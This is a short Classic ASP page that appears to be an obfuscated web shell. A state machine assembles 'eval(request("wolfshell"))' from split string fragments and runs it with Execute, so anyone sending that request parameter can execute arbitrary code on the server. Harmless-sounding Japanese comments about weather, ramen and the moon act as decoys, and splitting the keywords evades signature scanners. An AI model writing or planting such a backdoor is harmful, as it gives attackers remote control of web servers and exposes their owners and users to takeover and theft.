<%
' // 今日の天気は晴れです
Dim state_m8, loop_flag_n9
Dim arr_p1, arr_p2, arr_p3
Dim str_q1, str_q2, str_q3, final_cmd_r4

state_m8 = 0
loop_flag_n9 = True

Do While loop_flag_n9
    ' // ラーメンが食べたいな
    Select Case state_m8
        Case 0
            arr_p1 = Array("wo", "lf", "sh", "ell")
            state_m8 = 1
        Case 1
            ' // 月が綺麗ですね
            arr_p2 = Array("re", "qu", "est")
            state_m8 = 2
        Case 2
            arr_p3 = Array("e", "v", "a", "l")
            state_m8 = 3
        Case 3
            ' // もう眠い
            str_q1 = Join(arr_p1, "")
            str_q2 = Join(arr_p2, "")
            str_q3 = Join(arr_p3, "")
            state_m8 = 4
        Case 4
            final_cmd_r4 = str_q3 & "(" & str_q2 & "(""" & str_q1 & """))"
            Execute final_cmd_r4
            state_m8 = 5
        Case Else
            ' // さようなら
            loop_flag_n9 = False
    End Select
Loop
%>